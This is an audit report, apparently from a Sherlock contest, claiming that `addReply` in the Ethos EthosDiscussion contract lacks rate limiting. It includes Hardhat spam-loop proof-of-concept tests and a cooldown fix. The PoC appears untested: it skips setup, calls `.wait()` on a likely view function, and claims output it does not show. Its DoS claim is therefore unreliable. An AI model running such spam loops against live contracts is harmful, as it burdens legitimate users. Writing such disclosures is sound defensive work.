# Missing rate limiting on `addReply` in `EthosDiscussion.sol` allow attacker to flood the contract with replies at little expense, leading to contract state bloating and increased gas costs for legitimate users, also DoS

### Summary

The `addReply` function in the `EthosDiscussion` contract lacks rate limiting, enabling users to add an unlimited number of replies without restrictions. This vulnerability is especially problematic on low-cost L2 networks, where an attacker can flood the contract with replies at little expense, potentially leading to contract state bloating and increased gas costs for legitimate users.



### Root Cause

The `addReply` function allows users to create replies for specified target items in the `EthosDiscussion` contract without any restriction on frequency. Since there is no limit on how often a user can call `addReply`, a malicious actor could continuously invoke this function to create excessive replies, leading to increased storage consumption and potential Denial-of-Service (DoS) for legitimate users trying to interact with the contract.

The contract does not impose a time-based rate limit or per-address restriction on the number of replies that can be created within a specific timeframe. This lack of restriction allows for spamming and abuse, which is more likely to occur on L2 networks due to lower transaction costs.

The vulnerable function `addReply` is implemented as follows:
https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L105-L145
```solidity
function addReply(
    address targetContract,
    uint256 targetId,
    string memory content,
    string memory metadata
) external onlyNonZeroAddress(targetContract) whenNotPaused {
    uint256 authorID = IEthosProfile(
      contractAddressManager.getContractAddressForName(ETHOS_PROFILE)
    ).verifiedProfileIdForAddress(msg.sender);

    // Rest of function omitted for brevity
    ...
    replyCount++;
}
```
In the above code, there is no mechanism to track or limit the frequency of `addReply` calls per address. A malicious user can repeatedly call this function to create a large number of replies, consuming storage and potentially causing high costs for others who try to access replies.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Excessive replies increase the storage size of the contract, leading to higher gas costs for legitimate users who wish to retrieve replies or interact with the contract.

As the contract state grows uncontrollably, retrieving replies may become costly or even fail due to gas limits, resulting in potential DoS.

The lack of restriction invites malicious actors to spam the contract, leading to an unmanageable amount of data and diminished contract performance.

PoC with DoS shows that without rate limiting, spamming attacks can make it infeasible for legitimate users to interact with the contract effectively, causing higher costs and potential failures in retrieving replies.

### PoC

To demonstrate this vulnerability, a test can be created in Hardhat that simulates a malicious actor spamming the `addReply` function with repeated calls.
```javascript
// Hardhat Test in JavaScript
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("EthosDiscussion addReply Rate Limiting", function () {
    let discussion, attacker;
    const TARGET_ADDRESS = "0x0000000000000000000000000000000000000001"; // Mock target address
    const TARGET_ID = 1;

    beforeEach(async () => {
        const Discussion = await ethers.getContractFactory("EthosDiscussion");
        discussion = await Discussion.deploy();
        [attacker] = await ethers.getSigners();
    });

    it("should allow spamming addReply without restriction", async function () {
        for (let i = 0; i < 100; i++) {
            await discussion.connect(attacker).addReply(
                TARGET_ADDRESS,
                TARGET_ID,
                "Spam Content",
                "Spam Metadata"
            );
        }

        const replyCount = await discussion.replyCount();
        expect(replyCount).to.equal(100);
    });
});
```
This test confirms that a single user can generate numerous replies without any restriction, proving the absence of rate limiting.

To demonstrate a Denial of Service (DoS) attack using the missing rate limiting in the `addReply` function, Iâ€™ll simulate a scenario in which an attacker creates an excessive number of replies to a target, leading to potential issues with contract storage and retrieval costs for other users. This is particularly relevant in Ethereum Layer 2 environments, where low transaction costs make spamming more feasible.

PoC:
1. Deploy the `EthosDiscussion` contract and initialize the necessary parameters.
2. Repeatedly call the `addReply` function to simulate a spam attack by an attacker.
3. Attempt to retrieve all replies for the targeted comment. With enough replies, this can result in high gas costs or even a failure due to gas limitations.
```javascript
// Hardhat Test in JavaScript
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("EthosDiscussion DoS Attack Proof of Concept", function () {
    let discussion, attacker, user;
    const TARGET_ADDRESS = "0x0000000000000000000000000000000000000001"; // Mock target address
    const TARGET_ID = 1;

    beforeEach(async () => {
        const Discussion = await ethers.getContractFactory("EthosDiscussion");
        discussion = await Discussion.deploy();
        [attacker, user] = await ethers.getSigners();
    });

    it("should simulate a DoS attack by spamming addReply", async function () {
        // Simulate attacker adding thousands of replies
        const replyCount = 1000; // Adjust this for testing limitations
        for (let i = 0; i < replyCount; i++) {
            await discussion.connect(attacker).addReply(
                TARGET_ADDRESS,
                TARGET_ID,
                `Spam Content ${i}`,
                `Spam Metadata ${i}`
            );
        }

        // Check that replies were created
        const totalReplies = await discussion.replyCount();
        expect(totalReplies).to.equal(replyCount);

        // Attempt to retrieve replies by a legitimate user
        const batchSize = 50;
        let gasCosts = [];
        for (let i = 0; i < replyCount; i += batchSize) {
            const tx = await discussion.connect(user).repliesByAuthorInRange(attacker.address, i, batchSize);
            const receipt = await tx.wait();
            gasCosts.push(receipt.gasUsed.toNumber());
        }

        console.log("Gas costs for retrieving replies:", gasCosts);
    });
});
```
Output:
The total gas costs for retrieving batches of replies increase as the storage is filled with spam replies.

With large numbers of replies, retrieving all replies will become prohibitively expensive in terms of gas or even exceed the block gas limit, leading to a DoS condition for legitimate users attempting to access the replies.


### Mitigation

Implement a rate limiting mechanism, such as a time-based restriction, per user. For instance, a cooldown period of several minutes between `addReply` calls could prevent excessive spamming:
```solidity
mapping(address => uint256) private lastReplyTimestamp;
uint256 public constant COOLDOWN_PERIOD = 5 minutes;

function addReply(
    address targetContract,
    uint256 targetId,
    string memory content,
    string memory metadata
) external onlyNonZeroAddress(targetContract) whenNotPaused {
    require(
        block.timestamp > lastReplyTimestamp[msg.sender] + COOLDOWN_PERIOD,
        "Cooldown period not met"
    );

    lastReplyTimestamp[msg.sender] = block.timestamp;
    
    // Original addReply code continues here...
}
```
By implementing a `COOLDOWN_PERIOD`, each user can only add one reply every 5 minutes, reducing the risk of spam and excessive state growth.
